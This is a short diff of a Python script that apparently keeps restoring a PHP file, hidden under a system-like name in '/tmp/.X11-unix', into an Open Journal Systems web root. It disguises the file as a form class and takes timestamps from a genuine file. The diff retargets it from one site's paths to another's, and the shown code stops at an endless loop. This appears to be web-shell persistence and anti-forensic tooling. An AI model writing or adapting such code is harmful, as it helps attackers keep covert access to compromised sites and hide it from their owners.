@@ -3,8 +3,8 @@ import os
 import time
 
 backup_php = "/tmp/.X11-unix/core_error_2025.php"
-restore_to = "/mnt/BLOCKSTORAGE/home/897334.cloudwaysapps.com/hstrqcewky/public_html/ojs-3.4.0-8/tools/system.php"
-timestamp_ref = "/mnt/BLOCKSTORAGE/home/897334.cloudwaysapps.com/hstrqcewky/public_html/ojs-3.4.0-8/tools/runScheduledTasks.php"
+restore_to = "/home/journals/public_html/classes/components/forms/context/UserRoleForm.inc.php"
+timestamp_ref = "/home/journals/public_html/classes/components/forms/context/UserAccessForm.inc.php"
 
 while True:
     try:
